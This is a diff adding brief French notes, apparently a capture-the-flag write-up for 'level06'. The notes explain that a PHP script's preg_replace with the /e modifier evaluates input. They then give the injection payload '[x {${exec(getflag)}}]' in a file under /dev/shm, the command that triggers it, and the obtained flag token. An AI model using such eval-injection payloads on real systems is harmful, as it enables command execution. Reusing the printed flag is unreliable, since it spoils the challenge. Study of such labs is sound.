@@ -1,0 +1,19 @@
+Le script php prend 2 arg en ligne de commande.
+
+La fonction y($m) prend une string $m en entree, et elle la modifie en remplacant chaque '.' par 'x' et chaque '@' par 'y' ! Elle renvoie la chaine modifiee.
+
+La fonction x($y, $z) prend 2 parametres. Elle ouvre un fichier dont le chemin est specifie par $y, lit son contenu et effectue plusieurs modifications sur ce contenu:
+
+on remarquera que la fonction preg_replace avec l'option /e presente des anomalies
+
+Je n'ai pas les droits de creer des dossiers alors on va creer un script vers le lien symbolique des fichiers partages : /dev/shm/
+
+puis on creer un dossier dedans : cat > /dev/shm/flag
+
+[x {${exec(getflag)}}]
+
+- On a creer un fichier qui contient une chaine a traiter par le fichier php. le script cherche le x, ensuite ${exec(getflag)} : on va tenter d'executer ce qu'il y a entre accolades.
+
+./level06 /dev/shm/flag
+
+wiok45aaoguiboiki2tuin6ub
